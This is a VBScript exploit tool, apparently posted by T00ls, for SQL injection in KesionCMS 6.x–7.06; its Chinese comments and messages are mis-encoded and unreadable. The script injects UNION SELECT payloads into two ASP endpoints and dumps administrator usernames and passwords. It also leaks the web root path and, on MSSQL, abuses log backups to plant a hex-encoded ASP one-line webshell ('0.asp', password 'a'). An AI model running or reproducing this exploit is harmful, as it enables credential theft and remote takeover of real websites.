'*=========================================================================
'* Intro	��Ѷkesion 6.x �C 7.06 SQL ע��©��VBS�����ù��ߵڶ���
'* Usage	��������ʾ�������룺Cscript.exe Exp.vbs Www.T00ls.Net
'* By		T00ls ���
'*=========================================================================

Function PostData(PostUrl)
'WScript.Echo PostUrl
    Dim Http
    Set Http = CreateObject("msxml2.serverXMLHTTP")
    With Http
        .Open "GET", PostUrl, False
        .Send()
        PostData = .ResponseText
    End With
    Set Http = Nothing
    Wscript.Sleep 2000
End Function

Function BackDB(PostUrl)
    Dim Http
    Set Http = CreateObject("msxml2.serverXMLHTTP")
    With Http
        .Open "GET", PostUrl, False
        .Send()
        WScript.Echo "[ " & .Status & " " & .statusText & " ] " & Unescape(Unescape(PostUrl))
        If .Status<>200 Then
            WScript.Echo "��־���챸�ݳ���"
            WScript.Quit
        End If
    End With
    Set Http = Nothing
    Wscript.Sleep 2000
End Function

Function IsSuccess(PostUrl, strSign)
    strData = PostData(PostUrl)
    'Wscript.Echo strData
    if InStr(strData, strSign) >0 then
        IsSuccess = True
    Else
        IsSuccess = False
    End If
End Function

Function Encode(strData)
    Dim strTemp, I
    For I = 1 To Len(strData)
        strTemp = strTemp & "%25" & Hex(Asc(Mid(strData, I, 1)))
    Next
    Encode = strTemp & "%2500"
End Function

Function getData(strData, patrn)
    dim strTemp 
    Set re = New RegExp
    re.Pattern = patrn
    re.IgnoreCase = True
    re.Global = True
    Set Matches = re.Execute(strData)
    For i = 0 To Matches.Count - 1
        If Matches(i).Value<>"" Then
            strTemp = strTemp & vbCrLf & Matches(i).SubMatches(0)
        End If
    Next
    getData = strTemp
End Function


Function GetStr(TmpBody,Str1,Str2,strrrr,strrrr2)
if instr(TmpBody,Str1)>0 and instr(TmpBody,Str2)>0 then
Dim TmpStr
if strrrr="" then 
strrrr=0
end if
if strrrr2="" then 
strrrr2=0
end if
BStr=Instr(TmpBody,Str1)
EStr=Instr(BStr+1,TmpBody,Str2)
TmpStr=Mid(TmpBody,Bstr+Len(Str1) + strrrr ,EStr-BStr-Len(Str1) + strrrr2)
GetStr=TmpStr
else
GetStr=TmpBody
end if
End Function

If WScript.Arguments.Count <> 1 Then
    WScript.Echo "* ================================================================"
    WScript.Echo "* Intro	��Ѷkesion 6.x �C 7.06 SQL ע��©��VBS�����ù��ߵڶ���"
    WScript.Echo "* By		T00ls ���"
    WScript.Echo "* Usage: 	Cscript.exe Exp.vbs Ҫ������ַ"
    WScript.Echo "* Example: 	Cscript.exe Exp.vbs http://www.qy9198.com/"
    WScript.Echo "* ================================================================"
    WScript.Quit
End If
attackUrl = WScript.Arguments(0)
attackUrl = Replace(attackUrl,"\","/")
If Right(attackUrl , 1) <> "/" Then
        attackUrl = attackUrl & "/"
End If

strHoleUrl = attackUrl & "user/reg/regajax.asp?action=getcityoption&province="
strTestUrl = strHoleUrl & Encode("' union Select 1, 'ExistHole' From KS_Admin")
WScript.Echo "���ڼ���Ƿ����©��...."
If IsSuccess(strTestUrl, "ExistHole") Then
    WScript.Echo "��ϲ������©��1"
	bAsql = 1
Else

	strHoleUrl = attackUrl & "plus/Ajaxs.asp?action=GetRelativeItem&Key=goingta%2525%2527%2529%2520"
	strTestUrl = strHoleUrl & Encode(" union Select 1,2, 'ExistHole' From KS_Admin")
	If IsSuccess(strTestUrl, "ExistHole") Then
    	WScript.Echo "��ϲ������©��2" 
	bAsql = 2
	Else
    	WScript.Echo "û�м�⵽©��"
	bAsql = 0
    	WScript.Quit
	end if
End If

if bAsql = 2 then
strTestUrl = strHoleUrl & Encode(" union Select 1,2, 'ExistHole'")
else
strTestUrl = strHoleUrl & Encode("' union Select 1, 'ExistHole'")
end if
WScript.Echo "���ڼ�������ݿ�����...."
If IsSuccess(strTestUrl, "ExistHole") Then
    WScript.Echo "���ݿ�Ϊ��MSSQL" 
    bAccess = False
Else
    WScript.Echo "���ݿ�Ϊ��ACCESS"
    bAccess = True
End If
WScript.Echo "���ڻ�ȡ�����ʺ�����...."
if bAsql = 2 then
strTestUrl = strHoleUrl & Encode(" union Select top 10 AdminID,AdminID,UserName+'|'+PassWord From KS_Admin")
else
strTestUrl = strHoleUrl & Encode("' union Select top 10 AdminID,UserName+'|'+PassWord From KS_Admin")
end if

WScript.Echo "�û���|���룺" &GetStr(PostData(strTestUrl),">","<",0,0)

WScript.Echo "���ڻ�ȡ��վ����·��...."
strTestUrl = strHoleUrl & "%25i"
strWebPath =  GetStr(PostData(strTestUrl),">","../",0,0)
strWebPath = mid(strWebPath,InstrRev(strWebPath,">")+1,len(strWebPath))
strWebPath = Replace(strWebPath, vbCrLf, "")
    WScript.Echo "��վ����·����" & strWebPath 
If Not bAccess Then
if bAsql = 2 then
    strTestUrl = strHoleUrl & Encode("' union Select 1,2, db_name()")
else
     strTestUrl = strHoleUrl & Encode("' union Select 1, db_name()")
end if
    strDatabase = getData(PostData(strTestUrl), "value=""([^""]+)")
    strDatabase = Replace(strDatabase, vbCrLf, "")
    WScript.Echo "MSSQL���ݿ���Ϊ��" & strDatabase

WScript.Echo "���ڽ������ݿ���챸��...."
If strWebPath <> "" And strDatabase <> "" Then
    BackDB(strHoleUrl & Encode("';alter database " & strDatabase & " set RECOVERY FULL"))
    BackDB(strHoleUrl & Encode("';create table cmd (a image)"))
    BackDB(strHoleUrl & Encode("';backup log " & strDatabase & " to disk = 'c:\cmd' with init"))
    BackDB(strHoleUrl & Encode("';insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E)"))
    BackDB(strHoleUrl & Encode("';backup log " & strDatabase & " to disk = '" & strWebPath & "0.asp'"))
    BackDB(strHoleUrl & Encode("';drop table cmd"))
    BackDB(strHoleUrl & Encode("';alter database "& strDatabase & " set RECOVERY SIMPLE"))
End If
WScript.Echo "Executeһ�仰ľ�����·��Ϊ��" & strWebPath & "0.asp"
WScript.Echo "����Ϊ��a"

End If
WScript.Echo "��ϣ���"